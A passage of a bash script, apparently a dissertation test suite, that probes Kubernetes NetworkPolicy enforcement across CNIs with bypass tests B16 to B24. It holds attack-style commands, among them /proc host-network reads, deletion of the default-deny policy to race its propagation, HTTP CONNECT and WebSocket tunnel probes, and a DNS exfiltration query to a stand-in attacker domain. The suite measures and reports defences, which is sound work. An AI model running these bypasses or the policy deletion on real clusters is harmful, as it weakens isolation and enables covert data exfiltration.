  PROC_PIVOT=$(exec_attack "cat /proc/1/net/tcp 2>/dev/null | wc -l" 2>/dev/null || echo "0")
  PROC_PIVOT=$(echo "$PROC_PIVOT" | tr -d ' \n')
  OWN_PROC=$(exec_attack "cat /proc/self/net/tcp 2>/dev/null | wc -l" 2>/dev/null || echo "0")
  OWN_PROC=$(echo "$OWN_PROC" | tr -d ' \n')
  if [[ "$PROC_PIVOT" -gt 1 ]] && [[ "$PROC_PIVOT" != "$OWN_PROC" ]]; then
    record_result "B16" "T1611" "/proc Network Namespace Pivot" "Kernel Bypass" \
      "ALLOWED" "/proc/1/net/tcp shows ${PROC_PIVOT} connections vs own ${OWN_PROC} — attacker reading host network connection table via /proc. No network connection made; completely invisible to NetworkPolicy and CNI"
  elif [[ "$OWN_PROC" -gt 1 ]]; then
    record_result "B16" "T1611" "/proc Network Namespace Pivot" "Kernel Bypass" \
      "ALLOWED" "/proc/self/net/tcp shows ${OWN_PROC} own connections — pod connection state readable. /proc/1/net not accessible (different netns). NetworkPolicy cannot block /proc reads"
  else
    record_result "B16" "T1611" "/proc Network Namespace Pivot" "Kernel Bypass" \
      "BLOCKED" "/proc network files empty or unreadable"
  fi

  # B17 — Loopback Interface Bypass (T1571)
  # The loopback interface (127.0.0.1) is internal to the pod.
  # NetworkPolicy does not apply to loopback traffic.
  # If a service binds to 0.0.0.0 AND loopback, intra-pod communication
  # via localhost is never filtered by the CNI.
  log "--- B17 | T1571 | Loopback Interface Bypass ---"
  LOOPBACK=$(exec_attack "nc -z -w2 127.0.0.1 6379 2>/dev/null && echo OPEN || echo CLOSED" 2>/dev/null || echo "CLOSED")
  # Also check if any services are listening locally
  LOCAL_LISTENERS=$(exec_attack "ss -tlnp 2>/dev/null | grep -v '127.0.0.1\|::1' | grep LISTEN | wc -l" 2>/dev/null || echo "0")
  if [[ "$LOOPBACK" == "OPEN" ]]; then
    record_result "B17" "T1571" "Loopback Interface Bypass" "Kernel Bypass" \
      "ALLOWED" "Service listening on loopback 127.0.0.1:6379 — loopback traffic is never subject to NetworkPolicy enforcement. Intra-pod communication is outside CNI scope"
  else
    record_result "B17" "T1571" "Loopback Interface Bypass" "Kernel Bypass" \
      "BLOCKED" "No services on loopback — loopback bypass not applicable to this pod (${LOCAL_LISTENERS} non-loopback listeners)"
  fi
}

# =============================================================================
# CATEGORY 5: CNI-SPECIFIC BYPASSES
# These tests target implementation-specific weaknesses in how each
# CNI translates NetworkPolicy into enforcement rules.
# =============================================================================
cat5() {
  log "============================================================"
  log " CATEGORY 5: CNI-Specific Implementation Bypasses"
  log "============================================================"
  log ""

  # B18 — Policy Propagation Race Condition (T1562)
  # When a NetworkPolicy is applied, it takes milliseconds to seconds
  # to propagate to all nodes and get written as iptables/eBPF rules.
  # An attacker who connects during this window bypasses the policy.
  # Calico propagates via Typha — eBPF writes are atomic but delayed.
  # This test measures enforcement latency by attempting connection
  # immediately after policy deletion and re-application.
  log "--- B18 | T1562 | Policy Propagation Race Condition ---"
  # Delete policy, immediately connect, re-apply
  kubectl delete networkpolicy default-deny-all -n "$NAMESPACE" \
    --context "$CTX" 2>/dev/null || true
  sleep 1
  # Attempt connection during propagation window
  RACE_RESULT=$(exec_attack "nc -z -w1 redis-cart.${NAMESPACE}.svc.cluster.local 6379 && echo OPEN || echo CLOSED" 2>/dev/null || echo "CLOSED")
  # Re-apply policy immediately
  kubectl apply -f default-deny.yaml --context "$CTX" 2>/dev/null || true
  if [[ "$RACE_RESULT" == "OPEN" ]]; then
    record_result "B18" "T1562" "Policy Propagation Race Condition" "CNI-Specific" \
      "ALLOWED" "Connection succeeded during 1-second policy deletion window — enforcement gap exists during policy changes. Time-of-check to time-of-enforcement gap exploitable"
  else
    record_result "B18" "T1562" "Policy Propagation Race Condition" "CNI-Specific" \
      "BLOCKED" "Connection failed even during policy deletion window — either propagation was instant or previous policy rules persisted briefly"
  fi

  # B19 — Empty Namespace Selector Bypass (T1078)
  # A NetworkPolicy with an empty namespaceSelector {} matches ALL namespaces.
  # If allow rules in another namespace have this misconfiguration,
  # traffic from any namespace is permitted.
  # This tests cross-namespace traffic visibility.
  log "--- B19 | T1078 | Cross-Namespace Traffic Bypass ---"
  # Check if any cross-namespace traffic is reachable
  KUBE_SYS_SVC=$(kubectl get svc -n kube-system --context "$CTX" \
    --no-headers 2>/dev/null | grep "kube-dns" | awk '{print $3}')
  if [[ -n "$KUBE_SYS_SVC" ]]; then
    if test_tcp "$KUBE_SYS_SVC" "53" 3; then
      record_result "B19" "T1078" "Cross-Namespace Traffic Bypass" "CNI-Specific" \
        "ALLOWED" "TCP to kube-dns in kube-system namespace (${KUBE_SYS_SVC}:53) succeeded — default namespace NetworkPolicy does not block traffic to other namespaces unless explicitly specified. Cross-namespace traffic requires namespace-scoped policies"
    else
      # Try UDP
      if test_udp "$KUBE_SYS_SVC" "53" 3; then
        record_result "B19" "T1078" "Cross-Namespace Traffic Bypass" "CNI-Specific" \
          "ALLOWED" "UDP to kube-dns (${KUBE_SYS_SVC}:53) succeeded — egress default-deny blocks cross-namespace traffic but DNS UDP may be implicitly permitted"
      else
        record_result "B19" "T1078" "Cross-Namespace Traffic Bypass" "CNI-Specific" \
          "BLOCKED" "Cross-namespace traffic to kube-system blocked — default-deny egress covering cross-namespace paths"
      fi
    fi
  else
    record_result "B19" "T1078" "Cross-Namespace Traffic Bypass" "CNI-Specific" \
      "ERROR" "Could not resolve kube-dns service IP for cross-namespace test"
  fi

  # B20 — Headless Service Direct Pod Access (T1021)
  # Headless services (clusterIP: None) return pod IPs directly via DNS.
  # Traffic goes pod-to-pod without kube-proxy DNAT.
  # This tests whether direct pod IP access is blocked consistently.
  log "--- B20 | T1021 | Headless Service Direct Pod IP Access ---"
  # Create a temporary headless service pointing to redis-cart
  cat <<EOF | kubectl apply --context "$CTX" -f - 2>/dev/null || true
apiVersion: v1
kind: Service
metadata:
  name: redis-cart-headless
  namespace: ${NAMESPACE}
spec:
  clusterIP: None
  selector:
    app: redis-cart
  ports:
  - port: 6379
    targetPort: 6379
EOF
  sleep 5
  HEADLESS_IP=$(exec_attack "nslookup redis-cart-headless.${NAMESPACE}.svc.cluster.local 2>/dev/null | grep 'Address:' | tail -1 | awk '{print \$2}'" 2>/dev/null || echo "")
  kubectl delete svc redis-cart-headless -n "$NAMESPACE" --context "$CTX" \
    --ignore-not-found=true 2>/dev/null || true
  if [[ -n "$HEADLESS_IP" ]]; then
    if test_tcp "$HEADLESS_IP" "6379" 3; then
      record_result "B20" "T1021" "Headless Service Direct Pod IP Access" "CNI-Specific" \
        "ALLOWED" "Direct pod IP ${HEADLESS_IP}:6379 reachable via headless service DNS — bypasses ClusterIP DNAT, goes direct pod-to-pod. NetworkPolicy should still block this but may have implementation gap"
    else
      record_result "B20" "T1021" "Headless Service Direct Pod IP Access" "CNI-Specific" \
        "BLOCKED" "Headless service resolved to ${HEADLESS_IP} but TCP blocked — NetworkPolicy correctly applied to pod IP regardless of service type"
    fi
  else
    record_result "B20" "T1021" "Headless Service Direct Pod IP Access" "CNI-Specific" \
      "BLOCKED" "DNS resolution failed for headless service — DNS egress blocked by default-deny"
  fi
}

# =============================================================================
# CATEGORY 6: APPLICATION LAYER BYPASSES
# These tests exploit application-level protocols that NetworkPolicy
# cannot inspect (L3/L4 enforcement cannot see L7 content).
# =============================================================================
cat6() {
  log "============================================================"
  log " CATEGORY 6: Application Layer Bypasses"
  log "============================================================"
  log ""

  # B21 — HTTP CONNECT Proxy Bypass (T1090)
  # If any pod runs an HTTP proxy, CONNECT method can tunnel any traffic.
  # NetworkPolicy allows the connection to the proxy but cannot see
  # that the proxy is tunneling blocked connections inside.
  # Only L7 policy (Cilium exclusive) can inspect CONNECT tunnels.
  log "--- B21 | T1090 | HTTP CONNECT Proxy Tunnel Bypass ---"
  # Test if frontend accepts HTTP CONNECT (it's nginx-based)
  CONNECT_OUT=$(exec_attack "curl -s -o /dev/null -w '%{http_code}' \
    --connect-timeout 3 \
    -X CONNECT http://frontend.${NAMESPACE}.svc.cluster.local:80/ \
    -H 'Host: redis-cart:6379'" 2>/dev/null || echo "000")
  # Also test if any pod accepts CONNECT to a blocked destination
  if [[ "$CONNECT_OUT" =~ ^(200|407)$ ]]; then
    record_result "B21" "T1090" "HTTP CONNECT Proxy Tunnel Bypass" "Application Layer" \
      "ALLOWED" "HTTP CONNECT accepted by frontend (${CONNECT_OUT}) — proxy tunnel possible. NetworkPolicy allows TCP:80 to frontend but cannot inspect CONNECT tunneling to blocked destinations. Only L7 policy (Cilium CiliumNetworkPolicy) can prevent this"
  else
    record_result "B21" "T1090" "HTTP CONNECT Proxy Tunnel Bypass" "Application Layer" \
      "BLOCKED" "HTTP CONNECT not accepted (${CONNECT_OUT}) — no open proxy available or frontend blocked by NetworkPolicy"
  fi

  # B22 — DNS Tunneling C2 Channel (T1071.004)
  # DNS queries can carry data in subdomain labels (e.g. data.attacker.com).
  # If UDP 53 egress to external resolvers is allowed, data exfiltration
  # via DNS TXT/CNAME queries is possible.
  # NetworkPolicy cannot inspect DNS query content — only L7 DNS policy can.
  log "--- B22 | T1071.004 | DNS Tunneling Covert C2 Channel ---"
  # Test A record external
  EXT_A=$(exec_attack "dig +short +timeout=3 A google.com @8.8.8.8 2>/dev/null | head -1" 2>/dev/null || echo "")
  # Test TXT record (primary DNS tunnel method)
  EXT_TXT=$(exec_attack "dig +short +timeout=3 TXT o-o.myaddr.l.google.com @8.8.8.8 2>/dev/null | head -1" 2>/dev/null || echo "")
  # Test if we can encode data in subdomain queries (DNS exfil technique)
  EXT_EXFIL=$(exec_attack "dig +timeout=3 AAAA aGVsbG8td29ybGQ.attacker-test.example @8.8.8.8 2>&1 | grep -c 'status:'" 2>/dev/null || echo "0")
  if [[ -n "$EXT_TXT" ]] || [[ -n "$EXT_A" ]]; then
    record_result "B22" "T1071.004" "DNS Tunneling Covert C2 Channel" "Application Layer" \
      "ALLOWED" "External DNS reachable — A record: ${EXT_A:0:20}, TXT: ${EXT_TXT:0:30}. Full DNS tunneling C2 channel viable. NetworkPolicy cannot inspect DNS content; only Cilium L7 DNS policy with allowed domains list can prevent arbitrary DNS queries"
  else
    record_result "B22" "T1071.004" "DNS Tunneling Covert C2 Channel" "Application Layer" \
      "BLOCKED" "External DNS unreachable — egress to 8.8.8.8:53 blocked by NetworkPolicy"
  fi

  # B23 — WebSocket Upgrade Bypass (T1071.001)
  # HTTP WebSocket upgrades (101 Switching Protocols) establish persistent
  # bidirectional channels. NetworkPolicy allows TCP:80 but cannot see
  # that the HTTP connection has been upgraded to a WebSocket tunnel.
  # An attacker who reaches frontend can upgrade to WebSocket and use
  # it as a persistent C2 channel.
  log "--- B23 | T1071.001 | WebSocket Protocol Upgrade Bypass ---"
  WS_OUT=$(exec_attack "curl -s -o /dev/null -w '%{http_code}' \
    --connect-timeout 3 \
    -H 'Upgrade: websocket' \
    -H 'Connection: Upgrade' \
    -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
    -H 'Sec-WebSocket-Version: 13' \
    http://frontend.${NAMESPACE}.svc.cluster.local:80/ws" 2>/dev/null || echo "000")
  FRONTEND_TCP=$(test_tcp "frontend.${NAMESPACE}.svc.cluster.local" "80" 3 && echo "OPEN" || echo "CLOSED")
  if [[ "$WS_OUT" =~ ^(101|200|400)$ ]] && [[ "$FRONTEND_TCP" == "OPEN" ]]; then
    record_result "B23" "T1071.001" "WebSocket Protocol Upgrade Bypass" "Application Layer" \
      "ALLOWED" "HTTP ${WS_OUT} — frontend reachable and WebSocket upgrade attempted. NetworkPolicy permits TCP:80 but cannot inspect WebSocket frames. L7 policy required to restrict WebSocket usage"
  elif [[ "$FRONTEND_TCP" == "OPEN" ]]; then
    record_result "B23" "T1071.001" "WebSocket Protocol Upgrade Bypass" "Application Layer" \
      "ALLOWED" "Frontend TCP:80 reachable — WebSocket upgrade path exists even if upgrade not accepted. NetworkPolicy allows connection; L7 content inspection not possible at L3/L4"
  else
    record_result "B23" "T1071.001" "WebSocket Protocol Upgrade Bypass" "Application Layer" \
      "BLOCKED" "Frontend unreachable — NetworkPolicy blocking TCP:80, WebSocket bypass not possible"
  fi

  # B24 — gRPC Reflection Service Discovery (T1046)
  # gRPC services with reflection enabled expose all methods and message types.
  # The Google Microservices Demo uses gRPC extensively.
  # NetworkPolicy allows TCP on gRPC ports but cannot inspect gRPC content.
  # An attacker who reaches a gRPC port can use reflection to enumerate all APIs.
  log "--- B24 | T1046 | gRPC Reflection Service Discovery ---"
  GRPC_OPEN=0
  GRPC_OPEN_SVC=""
  for SVC_PORT in "checkoutservice:5050" "paymentservice:50051" "shippingservice:50051" "productcatalogservice:3550"; do
    SVC=$(echo "$SVC_PORT" | cut -d: -f1)
    PORT=$(echo "$SVC_PORT" | cut -d: -f2)
    if test_tcp "${SVC}.${NAMESPACE}.svc.cluster.local" "$PORT" 3; then
      GRPC_OPEN=$((GRPC_OPEN + 1))
      GRPC_OPEN_SVC="${SVC}:${PORT}"
    fi
  done
  if [[ $GRPC_OPEN -gt 0 ]]; then
    record_result "B24" "T1046" "gRPC Reflection Service Discovery" "Application Layer" \
      "ALLOWED" "${GRPC_OPEN} gRPC service ports reachable (e.g. ${GRPC_OPEN_SVC}) — NetworkPolicy permits TCP but cannot inspect gRPC protocol. Reflection-enabled services expose full API schema to any connected client. Only Cilium L7 gRPC policy can restrict method-level access"
  else
    record_result "B24" "T1046" "gRPC Reflection Service Discovery" "Application Layer" \
      "BLOCKED" "All gRPC ports unreachable — NetworkPolicy blocking TCP to gRPC services"
  fi
}

# =============================================================================
# SUMMARY
# =============================================================================
print_summary() {
  log ""
  log "============================================================"
  log " BYPASS TEST SUITE — COMPLETE RESULTS"
  log "============================================================"
  log " Cluster  : ${CTX}"
  log " CNI      : ${CNI_NAME}"
  log " Date     : $(date)"
  log "------------------------------------------------------------"
  log " Total Bypass Tests : ${TOTAL}"
  log " BYPASSES CONFIRMED : ${ALLOWED}  ← Each is a dissertation finding"
  log " BLOCKED            : ${BLOCKED}"
  log " ERRORS             : ${ERRORS}"
  log ""
  if [[ $TOTAL -gt 0 ]]; then
    BYPASS_RATE=$(awk "BEGIN {printf \"%.1f\", (${ALLOWED}/${TOTAL})*100}")
    BLOCK_RATE=$(awk "BEGIN {printf \"%.1f\", (${BLOCKED}/${TOTAL})*100}")
    log " CNI Bypass Rate    : ${BYPASS_RATE}%  (lower = stronger enforcement)"
    log " CNI Block Rate     : ${BLOCK_RATE}%  (higher = stronger enforcement)"
  fi
  log "------------------------------------------------------------"
  log " Category Breakdown:"
  log "   Cat 1 - Network Namespace Bypasses  : B01-B04"
  log "   Cat 2 - Protocol and Port Bypasses  : B05-B09"
  log "   Cat 3 - Service and Routing Bypasses: B10-B13"
  log "   Cat 4 - Kernel and Capability       : B14-B17"
  log "   Cat 5 - CNI-Specific                : B18-B20"
  log "   Cat 6 - Application Layer           : B21-B24"
  log "------------------------------------------------------------"
  log " Report : ${REPORT_FILE}"
  log " CSV    : ${CSV_FILE}"
  log "============================================================"
}

# =============================================================================
# MAIN
# =============================================================================
log "============================================================"
log " CNI BYPASS TEST SUITE — 24 BYPASS TECHNIQUES"
log " Student: Sagarkumar Bhaveshbhai Bhikadiya | ID: 24051080"
log " Cluster: ${CTX}"
log " CNI    : ${CNI_NAME}"
log " Time   : $(date)"
log "============================================================"
log ""

init_csv
preflight

log ""
log "Starting bypass tests..."
log ""

cat1   # Network Namespace Bypasses   B01-B04
cat2   # Protocol and Port Bypasses   B05-B09
cat3   # Service and Routing Bypasses B10-B13
cat4   # Kernel and Capability        B14-B17
cat5   # CNI-Specific                 B18-B20
cat6   # Application Layer            B21-B24

print_summary

log ""
log "Done."
log "  Report : ${REPORT_FILE}"
log "  CSV    : ${CSV_FILE}"
